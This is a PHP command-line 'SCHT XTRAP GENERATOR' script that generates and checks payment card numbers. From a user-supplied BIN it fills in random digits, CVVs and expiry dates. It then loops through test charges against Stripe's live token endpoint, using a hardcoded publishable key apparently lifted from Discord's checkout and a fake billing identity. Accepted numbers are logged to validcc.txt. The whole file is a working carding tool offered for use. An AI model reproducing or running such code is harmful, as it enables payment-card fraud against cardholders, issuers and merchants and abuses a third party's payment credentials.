<?php

/*

\033[1;93m = Kuning
\033[1;95m = Ungu
\033[1;94m = Nila/Biru tua
\033[1;91m = Merah
\033[1;92m = Hijau
\033[0m = putih

Black        \033[0;30m     Dark Gray     \033[1;30m
Red          \033[0;31m     Light Red     \033[1;31m
Green        \033[0;32m     Light Green   \033[1;32m
Brown/Orange \033[0;33m    Yellow        \033[1;33m
Blue         \033[0;34m     Light Blue    \033[1;34m
Purple       \033[0;35m     Light Purple  \033[1;35m
Cyan         \033[0;36m     Light Cyan    \033[1;36m
Light Gray   \033[0;37m    White         \033[1;37m

    SCHT.XD
*/

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
$time = date('d-m-Y H:i:s');

require_once 'assets/geoip.php';
$requestModel = new Request();
$ip = $requestModel->getIpAddress();
$isValidIpAddress = $requestModel->isValidIpAddress($ip);
$geoLocationData = $requestModel->getLocation($ip);

$country = $geoLocationData['country'];
$countrycode = $geoLocationData['countryCode'];
$region = $geoLocationData['region'];
$regioname = $geoLocationData['regionName'];
$city = $geoLocationData['city'];
$zip = $geoLocationData['zip'];
$timezone = $geoLocationData['timezone'];
$isp = $geoLocationData['isp'];
$ips = $geoLocationData['query'];

$banner = "
\033[1;95m====================================
\033[1;92mW A L C O M E \033[1;93m[T O]\033[1;94m S C H T T O O L
\033[1;95m====================================
\033[1;92m███████╗ ██████╗██╗  ██╗   ████████╗
██╔════╝██╔════╝██║  ██║   ╚══██╔══╝
███████╗██║     ███████║█████╗██║   
╚════██║██║     ██╔══██║╚════╝██║   
███████║╚██████╗██║  ██║      ██║   
╚══════╝ ╚═════╝╚═╝  ╚═╝      ╚═╝                            
\033[1;95m====================================
\033[0;36m     ▪SCHT XTRAP GENERATOR▪
\033[1;95m====================================
\033[0;35mTIME: \033[1;33m$time  \033[1;92m▪ ONLINE
\033[1;95m====================================
\033[0;35mYour IP: \033[1;33m$ips
\033[0;35mCountry: \033[1;33m$country
\033[0;35mCountry Code: \033[1;33m$countrycode
\033[0;35mRegion: \033[1;33m$region
\033[0;35mRegion Name: \033[1;33m$regioname
\033[0;35mCity: \033[1;33m$city
\033[0;35mZip: \033[1;33m$zip
\033[0;35mTimezone: \033[1;33m$timezone
\033[0;35mIsp: \033[1;33m$isp
\033[1;95m====================================
\033[0m\n";
echo "\n\033[1;97mLoading \033[1;35m▪\r";
sleep(2);
echo "\033[1;97mLoading \033[1;35m▪ \033[1;35m▪\r";
sleep(1);
echo "\033[1;97mLoading \033[1;35m▪ \033[1;35m▪ \033[1;35m▪ \r";
sleep(1);
echo "\033[1;97mLoading \033[1;35m▪ \033[1;35m▪ \033[1;35m▪ \033[1;35m▪ \r";
sleep(1);
echo "\033[1;97mLoading \033[1;35m▪ \033[1;35m▪ \033[1;35m▪ \033[1;35m▪ \033[1;35m▪ \r";
sleep(1);
system('clear');
system("xdg-open https://www.facebook.com/imnoob59");
sleep(1);
echo $banner;
sleep(2);

echo "\033[0;35mBIN \033[0;37m(ex: 01234567890xxx8x) :\033[0m ";
$a = trim(fgets(STDIN));
echo "\n";
while (1) {

    $cvv = rand(000, 999);
    $month = rand(01, 12);
    $year = rand(2022, 2029);
    $b = str_split($a, 1);
    $card = "";
    foreach ($b as $splitCard) {
        $check = ($splitCard == "x") ? rand(0, 9) : $splitCard;
        $card .= $check;
    }

    $splitCard2 = str_split($card, 4);
    $fixCard = implode("+", $splitCard2);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/tokens");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Accept: application/json", "Content-Type: application/x-www-form-urlencoded", "Origin: https://js.stripe.com", "Referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fdiscord.com&stripe_xdm_c=default509095&stripe_xdm_p=1"));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "time_on_page=1080400&pasted_fields=number%2Czip&guid=NA&muid=f4d48849-7e13-4640-b065-cac94973692874a7ee&sid=249b36de-691b-410e-8458-5cd8bd46901f63a13a&key=pk_live_CUQtlpQUF0vufWpnpUmQvcdi&payment_user_agent=stripe.js%2F7315d41&card[number]=" . $fixCard . "&card[cvc]=" . $cvv . "&card[name]=Michael+S.+Walker&card[address_line1]=1835++College+Avenue&card[address_line2]=&card[address_city]=TULSA&card[address_state]=OK&card[address_zip]=74192&card[address_country]=US&card[exp_month]=" . $month . "&card[exp_year]=" . $year);
    $exe = curl_exec($ch);
    curl_close($ch);

    $response = json_decode($exe);

    if ($response->error != null) {
        echo "\e[31m[INVALID] \e[00m" . $card . "|" . $month . "|" . $year . "|" . $cvv . "\n";
    } else {
        echo "\e[92m[VALID] \e[00m" . $card . "|" . $month . "|" . $year . "|" . $cvv . "\n";
        $o = fopen("validcc.txt", 'a');
        fwrite($o, $card . "|" . $month . "|" . $year . "|" . $cvv . "\n");
        fclose($o);
    }
}
